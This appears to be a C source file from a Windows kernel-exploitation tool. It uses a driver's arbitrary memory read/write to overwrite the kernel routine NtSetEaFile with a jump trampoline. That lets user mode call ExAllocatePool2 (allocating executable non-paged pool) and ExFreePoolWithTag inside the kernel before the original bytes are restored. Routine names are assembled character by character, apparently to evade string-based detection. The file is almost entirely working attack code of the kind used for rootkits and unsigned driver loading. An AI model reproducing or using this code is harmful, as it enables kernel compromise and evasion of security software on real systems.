#include "main.h"

NTSTATUS HookSystemRoutine(_In_ PDEVICE_DRIVER_OBJECT Driver, _In_ ULONGLONG NewAddress, _Out_writes_bytes_(12) PUCHAR Native)
{
    UCHAR shellcode[12];
    NTSTATUS status;
    ULONGLONG routineAddr;
    WCHAR routineName[12];
    routineName[0]  = L'N';
    routineName[1]  = L't';
    routineName[2]  = L'S';
    routineName[3]  = L'e';
    routineName[4]  = L't';
    routineName[5]  = L'E';
    routineName[6]  = L'a';
    routineName[7]  = L'F';
    routineName[8]  = L'i';
    routineName[9]  = L'l';
    routineName[10] = L'e';
    routineName[11] = L'\0';

    routineAddr = GetSystemRoutineAddressW(routineName);
    if (routineAddr == 0)
        return STATUS_NOT_FOUND;

    RTL_ASSERT(routineAddr != 0);
    RtlZeroMemory(shellcode, sizeof(shellcode));
    shellcode[0]               = 0x48;
    shellcode[1]               = 0xb8;
    *(ULONGLONG*)&shellcode[2] = NewAddress;
    shellcode[10]              = 0xff;
    shellcode[11]              = 0xe0;

    status = Driver->ReadMemory(Driver->DeviceHandle, routineAddr, Native, sizeof(shellcode));
    if NT_SUCCESS (status) {
        status = Driver->WriteMemory(Driver->DeviceHandle, routineAddr, shellcode, sizeof(shellcode));
    }

    return status;
}

NTSTATUS UnhookSystemRoutine(_In_ PDEVICE_DRIVER_OBJECT Driver, _In_reads_bytes_(12) PUCHAR Native)
{
    ULONGLONG routineAddr;
    WCHAR routineName[12];
    routineName[0]  = L'N';
    routineName[1]  = L't';
    routineName[2]  = L'S';
    routineName[3]  = L'e';
    routineName[4]  = L't';
    routineName[5]  = L'E';
    routineName[6]  = L'a';
    routineName[7]  = L'F';
    routineName[8]  = L'i';
    routineName[9]  = L'l';
    routineName[10] = L'e';
    routineName[11] = L'\0';

    routineAddr = GetSystemRoutineAddressW(routineName);
    if (routineAddr == 0)
        return STATUS_NOT_FOUND;

    return Driver->WriteMemory(Driver->DeviceHandle, routineAddr, Native, 12);
}

ULONGLONG ExAllocatePool2(_In_ PDEVICE_DRIVER_OBJECT Driver, _In_ SIZE_T NumberOfBytes)
{
    typedef ULONGLONG (*ROUTINE_TYPE)(ULONGLONG, SIZE_T, ULONG);
    ROUTINE_TYPE Routine;
    ULONGLONG Result;
    ULONGLONG PoolFlags;
    ULONGLONG Address;
    UCHAR buffer[12];

    WCHAR routineName[16];
    routineName[0]  = L'E';
    routineName[1]  = L'x';
    routineName[2]  = L'A';
    routineName[3]  = L'l';
    routineName[4]  = L'l';
    routineName[5]  = L'o';
    routineName[6]  = L'c';
    routineName[7]  = L'a';
    routineName[8]  = L't';
    routineName[9]  = L'e';
    routineName[10] = L'P';
    routineName[11] = L'o';
    routineName[12] = L'o';
    routineName[13] = L'l';
    routineName[14] = L'2';
    routineName[15] = L'\0';

    Result    = 0;
    Address   = GetSystemRoutineAddressW(routineName);
    PoolFlags = 0x0000000000000080UI64; // NonPagedPool Execute

    if NT_SUCCESS (HookSystemRoutine(Driver, Address, buffer)) {
        Routine = (ROUTINE_TYPE)NtSetEaFile;
        Result  = Routine(PoolFlags, NumberOfBytes, 'enoN');

        UnhookSystemRoutine(Driver, buffer);
    }

    return Result;
}

VOID ExFreePool(_In_ PDEVICE_DRIVER_OBJECT Driver, _In_ ULONGLONG Pointer)
{
    typedef VOID (*ROUTINE_TYPE)(ULONGLONG, ULONG);
    ROUTINE_TYPE Routine;
    ULONGLONG Address;
    UCHAR buffer[12];

    WCHAR routineName[18];
    routineName[0]  = L'E';
    routineName[1]  = L'x';
    routineName[2]  = L'F';
    routineName[3]  = L'r';
    routineName[4]  = L'e';
    routineName[5]  = L'e';
    routineName[6]  = L'P';
    routineName[7]  = L'o';
    routineName[8]  = L'o';
    routineName[9]  = L'l';
    routineName[10] = L'W';
    routineName[11] = L'i';
    routineName[12] = L't';
    routineName[13] = L'h';
    routineName[14] = L'T';
    routineName[15] = L'a';
    routineName[16] = L'g';
    routineName[17] = L'\0';

    Address = GetSystemRoutineAddressW(routineName);
    if NT_SUCCESS (HookSystemRoutine(Driver, Address, buffer)) {
        Routine = (ROUTINE_TYPE)NtSetEaFile;
        Routine(Pointer, 'enoN');
        UnhookSystemRoutine(Driver, buffer);
    }
}
